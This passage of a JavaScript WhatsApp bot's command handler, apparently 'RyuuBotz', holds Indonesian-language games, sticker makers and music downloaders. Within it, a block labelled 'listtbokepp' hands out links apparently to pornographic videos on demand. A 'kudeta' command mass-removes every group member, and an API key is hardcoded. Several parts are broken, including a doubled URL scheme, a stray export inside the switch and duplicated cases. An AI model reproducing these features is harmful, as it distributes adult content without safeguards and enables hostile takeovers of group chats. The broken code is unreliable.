		RyuuBotz.misi[id] = [
            kerja,
            setTimeout(() => {
                delete RyuuBotz.misi[id]
            }, 27000)
        ]
        
        setTimeout(() => {
            reply(hsl)
        }, 27000)

        setTimeout(() => {
            reply(dimas4)
        }, 25000)

        setTimeout(() => {
            reply(dimas3)
        }, 20000)

        setTimeout(() => {
            reply(dimas2)
        }, 15000)

        setTimeout(() => {
            reply(dimas)
        }, 10000)

        setTimeout(() => {
            reply('🔍Mencari pelanggan.....')
        }, 0)
        user.lastmisi = new Date * 1
    } else reply(`Silahkan Menunggu Selama ${timers}, Untuk Menyelesaikan Misi Kembali`)
}
break
//==================================================================
case 'maling': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
  var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    
  
  hours = (hours < 10) ? "0" + hours : hours
  minutes = (minutes < 10) ? "0" + minutes : minutes
  seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
}
const timeout = 604800000

    let user = db.users[m.sender]
    let time = user.lastmaling + 604800000
    if (new Date - user.lastmaling< 604800000) return reply(`📮Anda sudah merampok bank\nTunggu selama ⏲️ ${msToTime(time - new Date())} lagi`)
	let money = `${Math.floor(Math.random() * 30000)}`.trim()
	let exp = `${Math.floor(Math.random() * 999)}`.trim()
	let kardus = `${Math.floor(Math.random() * 1000)}`.trim()
	user.money += money * 1
	user.exp += exp * 1
	user.kardus += kardus * 1
	user.lastmaling = new Date * 1
    reply(`Selamat kamu mendapatkan : \n💰+${money} Money\📦+${kardus} Kardus\n✨+${exp} Exp`)
    setTimeout(() => {
        reply(`Yuk waktunya Maling lagi 👋…`)
    }, timeout)
}
break
//==================================================================
case 'mancing': {
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
  let h = Math.floor(ms / 3600000)
  let m = Math.floor(ms / 60000) % 60
  let s = Math.floor(ms / 1000) % 60
  return [h, m, s].map(v => v.toString().padStart(2, 0) ).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let timers = clockString(_timers) 
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
    let kerja = 'Memancing'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        reply(`Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (user.umpan == 0) return reply('Kamu Membutuhkan Umpan 🪱 Untuk Memancing!')
    if (user.fishingrod == 0 ) return reply('Kamu Harus Mempunyai Fishingrod 🎣 Terlebih Dahulu Jika Ingin Memancing')
    if (new Date - user.lastmisi > 3600000) {
		let ikan1 = Math.floor(Math.random() * 5)
		let ikan2 = Math.floor(Math.random() * 5)
		let ikan3 = Math.floor(Math.random() * 5)
		let ikan4 = Math.floor(Math.random() * 5)
		let ikan5 = Math.floor(Math.random() * 5)
		let ikan6 = Math.floor(Math.random() * 5)
		let ikan7 = Math.floor(Math.random() * 5)
		let ikan8 = Math.floor(Math.random() * 5)
		let ikan9 = Math.floor(Math.random() * 5)
		let ikan10 = Math.floor(Math.random() * 5)
		let ikan11 = Math.floor(Math.random() * 5)
           
		let hsl = `   
*📮 Hasil tangkapan Mu*
${ikan1 ? `
🦀 Kepiting: ${ikan1}` : ''} ${ikan2 ? `
🦞 Lobster: ${ikan2}` : ''} ${ikan3 ? `
🦐 Udang: ${ikan3}` : ''} ${ikan4 ? `
🦑 Cumi: ${ikan4}` : ''} ${ikan5 ? `
🐙 Gurita: ${ikan5}` : ''} ${ikan6 ? `
🐡 Buntal: ${ikan6}` : ''} ${ikan7 ? `
🐠 Dory: ${ikan7}` : ''} ${ikan8 ? `
🐳 Orca: ${ikan8}` : ''} ${ikan9 ? `
🐬 Lumba: ${ikan9}` : ''} ${ikan10 ? `
🐋 Paus: ${ikan10}` : ''} ${ikan11 ? `
🦈 Hiu: ${ikan11}` : ''}
`.trim()
		user.kepiting += ikan1
		user.lobster += ikan2
		user.udang += ikan3
		user.cumi += ikan4
		user.gurita += ikan5
		user.buntal += ikan6
		user.dory += ikan7
		user.orca += ikan8
		user.lumba += ikan9
		user.paus += ikan10
		user.hiu += ikan11
		user.fishingroddurability -= 10
		user.umpan -= 1
		
		RyuuBotz.misi[id] = [
        kerja,
        setTimeout(() => {
            delete RyuuBotz.misi[id]
        }, 20000)
    	]
    
		setTimeout(() => {
			reply(hsl)
		}, 20000)

		setTimeout(() => {
			reply(`Ini Dia Hasil Tangkapanmu`)
		}, 18000)

		setTimeout(() => {
			reply('Kamu Berhasil Menarik Ikan Keluar Dari Air')
		}, 15000)

		setTimeout(() => {
			reply('Kamu Menarik Kailmu')
		}, 12000)
		
		setTimeout(() => {
			reply('Kail Mu Di Tarik Ikan...')
		}, 9000)

		setTimeout(() => {
			reply('Kamu Sedang Memancing...')
		}, 0)
		user.lastmisi = new Date * 1
	} else reply(`Mohon Tunggu Selama ${timers} Sebelum Memulai Misi Kembali`)
}
break

//==================================================================
case 'nguli': {
  if (!m.isGroup) return reply(mess.only.group)
    if (new Date - global.db.users[m.sender].lastnguli > 86400000) {
      global.db.users[m.sender].limit += 10
      reply('_🎉Selamat kamu mendapatkan +10 limit_')
      global.db.users[m.sender].lastnguli = new Date * 1
    } else reply('[💬] Anda sudah mengklaim upah nguli hari ini')
  }
break;
case "brat3": {
    const tipe = args[0]?.toLowerCase();
    const isImg = tipe === "img";
    const isVid = tipe === "vid";
    const teks = isImg || isVid ? args.slice(1).join(" ") : text;
    if (!teks) return example(`vid/img teks`);
    if (!isImg && !isVid) {
        const button = [
            {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                    title: "Pilih Jenis Brat Sticker",
                    sections: [
                        {
                            title: "Tipe Brat",
                            highlight_label: "New",
                            rows: [
                                {
                                    title: "Brat Video",
                                    description: "Sticker GIF brat bergerak",
                                    id: `.brat vid ${teks}`
                                },
                                {
                                    title: "Brat Image",
                                    description: "Sticker brat teks image",
                                    id: `.brat img ${teks}`
                                },
                                {
                                    title: "Brat Anime",
                                    description: "Sticker brat teks dengan char anime",
                                    id: `.bratnime ${teks}`
                                }
                            ]
                        }
                    ]
                })
            }
        ];

        const msg = generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: { deviceListMetadata: {}, deviceListMetadataVersion: 2 },
                    interactiveMessage: proto.Message.InteractiveMessage.create({
                        body: proto.Message.InteractiveMessage.Body.create({ text: `Pilih jenis brat untuk\n*teks:* *${teks}*` }),
                        footer: proto.Message.InteractiveMessage.Footer.create({ text: global.foot }),
                        header: { hasMediaAttachment: false },
                        nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                            buttons: button})})}}
        }, { userJid: m.sender, quoted: m });

        return await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, { messageId: msg.key.id });
    }try {
        await RyuuBotz.sendMessage(m.chat, {
            react: { text: "⏱️", key: m.key }
        });
        if (isImg) {
            await RyuuBotz.sendImageAsSticker(m.chat, `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`, m, {
                packname: global.packname,
                author: global.author
            });
        } else if (isVid) {
            const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=true&delay=500`;
            const response = await axios.get(url, { responseType: "arraybuffer" });
            await RyuuBotz.sendVideoAsSticker(m.chat, response.data, m, {
                packname: global.packname,
                author: global.author
            });
        }
    } catch (err) {
        console.error("BRAT ERROR:", err);
        reply("[ x ] Gagal mengirim stiker brat.");
    }
}
break;
case 'bratnime': {
  if (!text) return reply(`halo bro`);
  if (text.length > 250) return reply(`Karakter terbatas, maksimal 250 huruf!`);
await reactLoading(m);
  try {
    const res = await fetch(`https://fastrestapis.fasturl.cloud/maker/animbrat?text=${encodeURIComponent(text)}&position=center&mode=image`);
    if (!res.ok) throw 'API error';

    const buffer = await res.buffer();

    await RyuuBotz.sendImageAsSticker(m.chat, buffer, m, {
      packname: global.packname,
      author: global.author
    });
  } catch (err) {
    console.error(err);
    balas('[ x ] Gagal mengambil stiker bratnime. Coba lagi nanti.');
  }
}
break;
// case 'brat': {
  // const quo = args.length >= 1 
    // ? args.join(" ") 
    // : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;

  // if (!quo) return replyryuu("Masukkan teksnya dulu dong~");

  // await RyuuBotz.sendMessage(m.chat, {
    // react: { text: "⏱️", key: m.key }
  // });

  // const brat = async (text) => {
    // try {
      // const res = await axios.get("https://api.betabotz.eu.org/api/maker/brat", {
        // params: {
          // text,
          // apikey: "Btz-Wwtvp"
        // },
        // responseType: "arraybuffer"
      // });
      // const image = Buffer.from(res.data);
      // if (image.length <= 10240) throw new Error("Hasil terlalu kecil.");
      // return image;
    // } catch (err) {
      // console.error('Error brat:', err.message);
      // return null;
    // }
  // };

  // const buf = await brat(quo);
  // if (!buf) return replyryuu("Gagal membuat stiker brat, coba lagi nanti yaa~");

  // await RyuuBotz.sendImageAsSticker(m.chat, buf, m, {
    // packname: global.packname,
    // author: global.author
  // });
// }
// break;
      case "brat": { 
    if (!text) return reply('❌ Masukkan teks untuk membuat stiker.');
    RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    try {
        const url = `https://api.siputzx.my.id/api/m/brat?text=${encodeURIComponent(text)}&isVideo=false&delay=500`;
        const response = await axios.get(url, { responseType: "arraybuffer" });

        const { Sticker } = require('wa-sticker-formatter');
        const sticker = new Sticker(response.data, {
            pack: global.packname,
            author: global.author,
            type: "image",
        });

        const stikerBuffer = await sticker.toBuffer();
        RyuuBotz.sendMessage(m.chat, { sticker: stikerBuffer }, { quoted: m });

    } catch (err) {
        console.error("❌ Error:", err);
        reply("Terjadi kesalahan saat membuat stiker.");
    }
}
break;
///////listtbokepp////////
case 'bratft': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
  
  if (!quo) return reply("masukan teksnya woii");
  
async function brat(text) {
  try {
    return await new Promise((resolve, reject) => {
      if(!text) return reject("missing text input");
      axios.get("https://brat.caliphdev.com/api/brat", {
        params: {
          text
        },
        responseType: "arraybuffer"
      }).then(res => {
        const image = Buffer.from(res.data);
        if(image.length <= 10240) return reject("failed generate brat");
        return resolve({
          success: true, 
          image
        })
      })
    })
  } catch (e) {
    return {
      success: false,
      errors: e
    }
  }
}

const buf = await brat(quo);
await RyuuBotz.sendImage(m.chat, buf.image, m, { packname: global.packname, author: global.author })
}
break
case "listbkp":{
Reply('ada 20 bkp ketik contoh : bkp1')
}
break
case "bkp1":{
Reply('https://videy.co/v?id=yUI9qHxy1')
}
break
case "bkp2":{
Reply('https://videy.co/v?id=taEdfX521')
}
break
case "bkp3":{
Reply('https://videy.co/v?id=IZ2dEEPR1')
}
break
case "bkp4":{
Reply('https://videy.co/v?id=cFmHXLnR1')
}
break
case "bkp5":{
Reply('https://videy.co/v?id=VkhX0rIY1')
}
break
case "bkp6":{
Reply('https://videy.co/v?id=HbciV3Ng1')
}
break
case "bkp7":{
Reply('https://videy.co/v?id=iDZaNE341')
}
break
case "bkp8":{
Reply('https://videy.co/v?id=99FZhvO21')
}
break
case "bkp9":{
Reply('https://videy.co/v?id=5JeZNWaH1')
}
break
case "bkp10":{
Reply('https://videy.co/v?id=KTw1lWWa1')
}
break
case "bkp11":{
Reply('https://videy.co/v?id=UdqYuonc1')
}
break
case "bkp12":{
Reply('https://videy.co/v?id=vApGwZAC1')
}
break
case "bkp13":{
Reply('https://videy.co/v?id=ji0jr2f71')
}
break
case "bkp14":{
Reply('https://videy.co/v?id=kxx94sEr1')
}
break
case "bkp15":{
Reply('https://videy.co/v?id=jRlBDROc1')
}
break
case "bkp16":{
Reply('https://videy.co/v?id=LevNyK2x1')
}
break
case "bkp17":{
Reply('https://videy.co/v?id=a1Uim8Ey')
}
break
case "bkp18":{
Reply('https://videyvideo.short.gy/Cwdcj1')
}
break
case "bkp19":{
Reply('https://videy.co/v?id=bliIEHfL1')
}
break
case "bkp20":{
Reply('https://videy.co/v?id=Yep64SD61')
}
break
///==============///////////////////
//================================================================================
case 'videy':{
    if (!text) return reply("Masukkan Link Videy")
    if (!text.includes('videy')) return reply("Itu Bukan Link Videy")
    try {
        let anu = await fetchJson(`https://api.agatz.xyz/api/videydl?url=${text}`);
        let anu1 = anu.data;
        RyuuBotz.sendMessage(m.chat, { video: { url: anu1 }, caption: "Downloader Videy" }, { quoted: m });
    } catch (err) {
        reply("Terjadi Kesalahan Saat Mengambil Data")
    }
}
break
///////////========================/////////
case "kudetagc": case "kudeta": {
if (!isRyuuTheCreator) return Reply(mess.owner)
let memberFilter = await m.metadata.participants.map(v => v.id).filter(e => e !== botNumber && e !== m.sender)
if (memberFilter.length < 1) return reply("Grup Ini Sudah Tidak Ada Member!")
await reply("Kudeta Grup By ReinzID Chx|Yoimiya-MD 🔥")
for (let i of memberFilter) {
await RyuuBotz.groupParticipantsUpdate(m.chat, [i], 'remove')
await sleep(1000)
}
await reply("Kudeta Grup Telah Berhasil 🏴‍☠️")
}
break
////////////////////////
case"upch":
case 'upsaluran':{
if (!text) return reply("teks?")
RyuuBotz.sendMessage(m.chat, { react: { text: '⏳', key: m.key, }})
await sleep(6000)
RyuuBotz.sendMessage(m.chat, { react: { text: '⌛', key: m.key, }})
RyuuBotz.sendMessage(`${global.idch}`, {audio: await quoted.download(), mimetype: "audio/mpeg", ptt: true, contextInfo: {
isForwarded: true, 
mentionedJid: [m.sender],
businessMessageForwardInfo: { 
businessOwnerJid: "120363389071422411@newsletter"
}, 
forwardedNewsletterMessageInfo: {
newsletterName: `${text}`,
newsletterJid: "120363389071422411@newsletter"}
}},{quoted: m})
await sleep(2000)
RyuuBotz.sendMessage(m.chat, { react: { text: '✅', key: m.key, }})
}
break
case 'upchv2': {
                if (!isCmd) return;
                    if (!quoted) {
                        return reply(`🖼️ *Fotonya mana?*`);
                    }
                
                    if (!args.length) {
                        return reply(`⚠️ *Masukkan ID channel dan teks/caption menggunakan format idch|text.*`);
                    }
                
                    // Memisahkan ID channel dan teks caption dari input menggunakan "|"
                    const input = args.join(' ').split('|');
                    const channelId = input[0].trim(); // ID channel
                    const caption = input[1] ? input[1].trim() : wm2 ; // Caption default jika tidak ada teks
                
                    // Cek apakah media adalah gambar
                    if (/image/.test(mime)) {
                        reply(mess.wait); // Mengirim pesan tunggu
                        let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
                
                        try {
                            // Mengupload gambar ke channel dengan caption custom
                            await RyuuBotz.sendMessage(channelId, {
                                image: media,
                                caption: caption
                            });
                
                            // Mengirim pesan konfirmasi
                            await reply(`✅ *Media gambar berhasil diupload ke channel:* ${channelId}`);
                        } catch (error) {
                            console.error('Error saat mengupload media gambar:', error);
                            await reply('❌ *Gagal mengupload gambar. Silakan periksa ID channel dan format media.*');
                        }
                    } 
                    // Cek apakah media adalah audio dan mengirim sebagai VN
                    else if (/audio/.test(mime)) {
                        reply(mess.wait); // Mengirim pesan tunggu
                        let media = await quoted.download(); // Mengunduh media dari pesan yang dikutip
                
                        try {
                            // Mengupload audio sebagai voice note (VN) ke channel
                            await RyuuBotz.sendMessage(channelId, {
                                audio: media,
                                ptt: true, // Mengirim sebagai pesan suara (voice note)
                                mimetype: 'audio/mp4' // Ganti jika perlu
                            });
                
                            // Mengirim pesan konfirmasi
                            await reply(`✅ *Voice note berhasil diupload ke channel:* ${channelId}`);
                        } catch (error) {
                            console.error('Error saat mengupload voice note:', error);
                            await reply('❌ *Gagal mengupload voice note. Silakan periksa ID channel dan format media.*');
                        }
                    } else {
                        await reply(`📸 *Silakan kirim atau reply foto atau audio dengan caption* ${prefix + command}`);
                    }
                
                    await sleep(5000); // Delay sebelum melanjutkan
                }
                break;
//==================================================================
  
case 'bratgenvid': {
const quo = args.length >= 1 ? args.join(" ") : m.quoted?.text || m.quoted?.caption || m.quoted?.description || null;
 
 if (!quo) return reply("masukan teksnya woii");
 
async function brat(text) {
 try {
 return await new Promise((resolve, reject) => {
 if(!text) return reject("missing text input");
 axios.get("https://https://fgsi-brat.hf.space/?text=Brat%20API%20BY%20FGSIDEV&isVideo=true", {
 params: {
 text
 },
 responseType: "arraybuffer"
 }).then(res => {
 const image = Buffer.from(res.data);
 if(image.length <= 10240) return reject("failed generate brat");
 return resolve({
 success: true, 
 image
 })
 })
 })
 } catch (e) {
 return {
 success: false,
 errors: e
 }
 }
}

const buf = await brat(quo);
await RyuuBotz.sendImageAsSticker(m.chat, buf.image, m, { packname: "ReinzID Chx", author: "Qiaa" })
}
break

case prefix + 'search-sticker': {
 if (!text) return reply(`Contoh: .${command} anime`);
 try {
 let tick = await (await fetch('https://endpoint.web.id/search/sticker?key=' + global.key + '&query=' + text)).json();
 if (tick.status) {
 let result = tick.result;
 let responseMessage = `*Title:* ${result.title}\n*Author:* ${result.author}\n*Author Link:* ${result.author_link}\n\n*Stickers:*\n`;
 result.sticker.forEach((stickerUrl, index) => {
 responseMessage += `Sticker ${index + 1}: ${stickerUrl}\n`;
 });
 reply(responseMessage);
 } else {
 reply('Tidak ada hasil ditemukan.');
 }
 } catch (e) {
 reply('Terjadi kesalahan!');
 }
}
break

case prefix + 'upscale2': case prefix + 'hd2': case prefix + 'hdr2': case prefix + 'remini2': {
 if (!/image/.test(mime)) {
 return reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Reply/Send Gambar Dengan Caption .${command}*`);
 }
 if (!quoted) {
 return reply(`*PERMINTAAN ERROR!! PESAN :*\\n> *Reply/Send Gamba Dengan Caption .${command}*`);
 }
 let media = await RyuuBotz.downloadAndSaveMediaMessage(quoted);
 let anu = await shannzCdn(media);
 let link = anu.result.url;
 let scale = await (await fetch('https://endpoint.web.id/tools/upscaler?key=' + global.key + '&url=' + link)).json();
 let final = scale.result.data.downloadUrls[0]
 RyuuBotz.sendMessage(m.chat, { image: { url: final }, caption: '*SUCCESS ✅*'}, { quoted: m})
}
break

break
case 'spotify1': case 'playspotify': case 'spotifys1': {
if (!text) return reply('Masukan judul lagu!')
let result = await searchSpotify(text)
 let caption = result.map((v, i) => {
 return {
 header: "",
 title: v.name,
 description: `Link: ${v.link}`,
 id: '.spdl ' + v.link
 }
 })
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 body: {
 text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
 },
 footer: {
 text: 'Mahiru Chx'
 },
 header: {
 title: "Spotify - Search",
 subtitle: "",
 hasMediaAttachment: false,
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "CLICK HERE",
 sections: [
 {
 title: "",
 rows: caption
 }
 ]
 })
 }
 ]
 }
 }
 }
 }
 }, { quoted: m }, {});
 await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
}
break
case 'spdl1': case 'spotifydl1': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nReinzID Chx`
 const p = await new canvafy.Spotify()
 .setTitle(result.title)
 .setAuthor("Spotify - Downloader")
 .setTimestamp(40, 100)
 .setOverlayOpacity(0.8)
 .setBorder("#fff", 0.8)
 .setImage(result.image)
 .setBlur(3)
 .build(); 

 await RyuuBotz.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
 RyuuBotz.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'ReinzID Chx' }, { quoted: m });
}
break

break
case 'spotify1': case 'playspotify': case 'spo1': {
if (!text) return reply('Masukan judul lagu!')
let result = await searchSpotify(text)
 let caption = result.map((v, i) => {
 return {
 header: "",
 title: v.name,
 description: `Link: ${v.link}`,
 id: '.spdl ' + v.link
 }
 })
 let msg = generateWAMessageFromContent(m.chat, {
 viewOnceMessage: {
 message: {
 messageContextInfo: {
 deviceListMetadata: {},
 deviceListMetadataVersion: 2
 },
 interactiveMessage: {
 body: {
 text: `🔎 Hasil Pencarian Dari ${text}\nSilahkan Pilih List dibawah ini`,
 },
 footer: {
 text: 'Mahiru Chx'
 },
 header: {
 title: "Spotify - Search",
 subtitle: "",
 hasMediaAttachment: false,
 },
 nativeFlowMessage: {
 buttons: [
 {
 name: "single_select",
 buttonParamsJson: JSON.stringify({
 title: "CLICK HERE",
 sections: [
 {
 title: "",
 rows: caption
 }
 ]
 })
 }
 ]
 }
 }
 }
 }
 }, { quoted: m }, {});
 await RyuuBotz.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
 });
}
break
case 'spdl1': case 'spotifydl1': {
if (!text) return reply('Masukan Link')
let result = await spotifydl(text)
let captionvid = `∘ Title: ${result.title}\n∘ Artist: ${result.artis}\n∘ Type: ${result.type}\n\nReinzID Chx`
 const p = await new canvafy.Spotify()
 .setTitle(result.title)
 .setAuthor("Spotify - Downloader")
 .setTimestamp(40, 100)
 .setOverlayOpacity(0.8)
 .setBorder("#fff", 0.8)
 .setImage(result.image)
 .setBlur(3)
 .build(); 

 await RyuuBotz.sendMessage(from, { image: p, caption: captionvid }, { quoted: m })
 RyuuBotz.sendMessage(m.chat, { audio: { url: result.download}, mimetype: 'audio/mpeg', filename: 'MP3 BY ' + 'ReinzID Chx' }, { quoted: m });
}
break

case 'presetam': {
const axios = require('axios');
const cheerio = require('cheerio');
`Ex : ${prefix + command} https://alightcreative.com/am/share/u/FttFe29F5Dd3AUOxUIiztaBmABw2/p/sd8WMnsElo-b71f57e092dbe21f?source=link`

if (!text) return reply(input)
if (!(text.includes('http://') || text.includes('https://'))) return reply(`url invalid, please input a valid url. Try with add http:// or https://`)
 if (!(text.includes('alight.link') || text.includes('alightcreative.com'))) return reply(`Invalid Alight Motion URL.`)
 
async function alightScrape(url) {
 try {
 const response = await axios.get(url, {
 headers: {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
 'Referer': 'https://alight.link',
 },
 });

const $ = cheerio.load(response.data);
const title = $('meta[property="og:title"]').attr('content').text();
const description = $('meta[property="og:description"]').attr('content').text();
return {
 title,
 description
}

/**
{
 title: 'Nama Proyek 22',
 description: 'This Alight Motion package contains 1 project, total 19.3 MB.'
}
*/

 } catch (error) {
 return error
 }
}
const njut = alightScrape(text);
reply(`[ *PRESET ALIGHT MOTION* ]

Judul: ${njut.title}
Deskripsi: ${njut.description}
`)
}
break
exports.fetchdata = async (url, options) => {
	try {
		options ? options : {}
		const res = await axios({
			method: "GET",
			url,
			headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.70 Safari/537.36",
				'DNT': 1,
				'Upgrade-Insecure-Request': 1
			},
			...options,
			responseType: 'arraybuffer'
		})
		return res.data
	} catch (err) {
		return err
	}
}
break
case 'yt': {
    if (!text) return reply(`Silakan masukkan judul lagu yang ingin dicari, Contoh: ${prefix + command} senorita`);
    const { fetchdata } = require("./all/function.js")
    const yts = require('yt-search');
    const query = text.trim();
    reply('✨Tunggu Sebentar, Sedang Mencari Lagu...');

    try {
        const searchResult = await yts(query);
        if (searchResult.videos.length === 0) {
            return reply('Tidak ada hasil ditemukan untuk pencarian tersebut.');
        }

        const video = searchResult.videos[0];
        const url = video.url;
        const format = 'mp3';

        const response = await axios.post('http://kinchan.sytes.net/ytdl/downloader', {
            url: url,
            format: format
        });

        const { title, downloadUrl } = response.data;

        const audioResponse = await axios.get(downloadUrl, { responseType: 'arraybuffer' });
        const audioBuffer = Buffer.from(audioResponse.data);

        await RyuuBotz.sendMessage(m.chat, {
            audio: audioBuffer,
            mimetype: 'audio/mp4',
            fileName: `${title}.mp3`,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 99999,
                externalAdReply: {
                    //showAdAttribution: true,
                    mediaType: 2,
                    previewType: 2,
                    mediaUrl: url,
                    title: title,
                    body: `views: ${video.views} / durasi: ${video.timestamp}`,
                    sourceUrl: url,
                    thumbnail: await fetchdata(video.thumbnail),
                    renderLargerThumbnail: true
                }
            }
        }, { quoted: m });

    } catch (error) {
        console.error('Error:', error);
        reply('Terjadi kesalahan saat mengunduh video, silahkan coba lagi.');
    }
}
break
case 'playyt': { 
if (!isPrem) return reply(mess.only.premium)
const yts = require('yt-search');
const randomAudioQuality = () => {
    const qualities = [1, 2, 3, 4]; // Indeks kualitas
    const randomIndex = Math.floor(Math.random() * qualities.length);
    return qualities[randomIndex];
};
const checkQuality = (type, qualityIndex) => {
    const qualities = {
        audio: { 1: '32', 2: '64', 3: '128', 4: '192' },
        video: { 1: '144', 2: '240', 3: '360', 4: '480', 5: '720', 6: '1080', 7: '1440', 8: '2160' }
    };
    if (!qualities[type]?.[qualityIndex]) {
        throw new Error(` Kualitas ${type} tidak valid. Pilih salah satu: ${Object.keys(qualities[type]).join(', ')}`);
    }
};
const fetchData = async (url, cdn, body = {}) => {
    const headers = {
        accept: '*/*',
        referer: 'https://ytshorts.savetube.me/',
        origin: 'https://ytshorts.savetube.me/',
        'user-agent': 'Postify/1.0.0',
        'Content-Type': 'application/json',
        authority: `cdn${cdn}.savetube.su`
    };
    try {
        const response = await axios.post(url, body, { headers });
        return response.data;
    } catch (error) {
        console.error(`Error accessing CDN${cdn}: ${error.message}`);
        throw new Error(' Gagal mengambil data dari server.');
    }
};
const randomCdn = () => {
    const availableCdns = [51, 52, 53, 54, 56, 57, 58, 59, 60, 61];
    return availableCdns[Math.floor(Math.random() * availableCdns.length)];
};
const dLink = (cdnUrl, type, quality, videoKey) => {
    return `https://${cdnUrl}/download`;
};
const dl = async (link, qualityIndex, typeIndex) => {
    const type = typeIndex === 1 ? 'audio' : 'video';
    const qualities = { 1: '32', 2: '64', 3: '128', 4: '192' };
    const quality = qualities[qualityIndex];
    if (!type) throw new Error('Tipe tidak valid. Pilih 1 untuk audio atau 2 untuk video');
    checkQuality(type, qualityIndex);
    const cdnNumber = randomCdn();
    const cdnUrl = `cdn${cdnNumber}.savetube.su`;
    const videoInfo = await fetchData(`https://${cdnUrl}/info`, cdnNumber, { url: link });
    const body = {
        downloadType: type,
        quality: quality,
        key: videoInfo.data.key
    };
    const dlRes = await fetchData(dLink(cdnUrl, type, quality, videoInfo.data.key), cdnNumber, body);
    return {
        link: dlRes.data.downloadUrl,
        duration: videoInfo.data.duration,
        durationLabel: videoInfo.data.durationLabel,
        fromCache: videoInfo.data.fromCache,
        id: videoInfo.data.id,
        key: videoInfo.data.key,
        thumbnail: videoInfo.data.thumbnail,
        thumbnail_formats: videoInfo.data.thumbnail_formats,
        title: videoInfo.data.title,
        titleSlug: videoInfo.data.titleSlug,
        videoUrl: videoInfo.data.url,
        quality,
        type
    };
};
if (!text) return reply(`Masukkan juga judul lagu, contoh *${command} lucid dreams*`);
try {
  RyuuBotz.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
    let rus = await yts(text);
    if (rus.all.length === 0) return reply("Video tidak ditemukan atau tidak bisa di-download.");
    let data = rus.all.filter(v => v.type === 'video');
    if (data.length === 0) return reply("Tidak ada video yang ditemukan.");
    let res = data[0];
    let thumbUrl = `https://i.ytimg.com/vi/${res.videoId}/hqdefault.jpg`;
    let inithumb = await getBuffer(thumbUrl);
    let teks = `*ᴘʟᴀʏɪɴɢ ᴍᴜsɪᴄ ɪɴ ʏᴏᴜᴛᴜʙᴇ*\n\n` +
               `📺 *ᴄʜᴀɴɴᴇʟ* : ${res.author.name}\n` +
               `👀 *ᴠɪᴇᴡᴇʀs* : ${res.views} kali\n` +
               `⏱️ *ᴅᴜʀᴀᴛɪᴏɴ* : ${res.timestamp}\n` +
               `🔗 *ᴜʀʟ ᴘʟᴀʏ* : ${res.url}\n\n` +
               `\n*sᴇᴅᴀɴɢ ᴍᴇɴɢɪʀɪᴍ ᴀᴜᴅɪᴏ....!*`;

    await RyuuBotz.sendMessage(m.chat, {
        contextInfo: { 
            externalAdReply: {  
                title: res.title,
                body: new Date().toLocaleString(),													
                mediaType: 2,  
                renderLargerThumbnail: true,
                thumbnail: inithumb,
                mediaUrl: res.url,
                sourceUrl: res.url
            }
        },
        image: { url: thumbUrl },
        text: teks
    }, { quoted: m });
          let mbut = await fetchJson(`https://ochinpo-helper.hf.space/yt?query=${text}`)
          let ahh = mbut.result
          let crot = ahh.download.audio
        const nt = await RyuuBotz.sendMessage(m.chat,{ audio: {url: crot}, mimetype: 'audio/mpeg', ptt: true },{quoted:m});
        await RyuuBotz.sendMessage(m.chat, { react: { text: '🎶', key: nt.key }})
        
} catch (err) {
    console.error(err);
    reply(`Terjadi kesalahan: ${err.message}`);
}
}
break
case 'alarm': {
let clockstring = '05:00' 
let isAlarmActive = false 

function playAlarm() {
  console.log('Alarm berbunyi!')
}

function setAlarmTime(time) {
  clockstring = time
  console.log(`Jam alarm berhasil diatur menjadi ${clockstring}`)
}


function turnOffAlarm() {
  clockstring = null
  console.log('Alarm berhasil dimatikan')
}
   
  let command = args[0] 

  if (command === 'atur') {
    let time = args[1] 
    setAlarmTime(time)
    isAlarmActive = true
    reply(`Jam alarm berhasil diatur menjadi ${clockstring}`)
  } else if (command === 'matikan') {
    turnOffAlarm()
